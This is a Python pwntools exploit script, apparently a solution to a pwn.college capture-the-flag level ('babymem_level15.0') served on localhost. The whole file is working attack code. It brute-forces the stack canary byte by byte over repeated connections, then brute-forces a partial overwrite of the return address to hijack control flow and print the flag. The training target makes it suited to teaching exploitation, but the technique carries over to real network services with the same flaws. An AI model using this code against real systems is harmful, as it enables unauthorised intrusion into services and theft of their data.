from pwn import *
import binascii

file = "/challenge/babymem_level15.0"
ip = "127.0.0.1"
port = 1337

buffer = 440
unicanarypos = 264
canarypos = 424
nibble2 = 11
buffersize = 412
firstbyte = b'\x0f'
canarynotfound = True
canary = b'\x00'
flagfound = False
flag = b''

for i in range(300):
    p = remote(ip, port)
    p.sendline(bytes(str(i), 'ascii'))
    p.sendline(b'A'*i)
    found = p.recvuntil(b'***: terminated', timeout=0.1)
    if len(found) == 0:
        print("failed")
    else:
        canarypos = i-1
        print(canarypos)
        break
    p.close()

while canarynotfound:
    for i in range(256):
        p = remote(ip, port)
        p.sendline(bytes(str((canarypos + len(canary) + 1)), 'ascii'))
        byte = i.to_bytes(1, 'big')
        p.sendline(b'A'*canarypos + canary + byte)
        print(canary)
        found = p.recvuntil(b'***: terminated', timeout=0.1)
        if len(found) == 0:
            canary = canary + byte
            p.close()
            break
        else:
            p.close()
    if len(canary) == 8:
        canarynotfound = False
for j in range(20):
    for i in range(16):
        p = remote(ip, port)
        nibble1 = (i%16)*16
        secondbyte = nibble1 + nibble2

        secondbyte = secondbyte.to_bytes(1, "little")
        p.sendline(bytes(str(canarypos+8+(j*8)+2), 'ascii'))
        p.sendline(b'A'*(canarypos) + canary + b'A'*(j*8) + firstbyte + secondbyte)
        found = p.recvuntil(b'pwn.college', timeout = 0.1)
        if len(found) != 0:
            flag = p.recvline()
            flagfound = True
            break
        else:
            print("failed")
            print(firstbyte + secondbyte)
            
        p.close()
    
    print(binascii.hexlify(canary))
    if flagfound:
        print(b'pwn.college' + flag)
        break
    
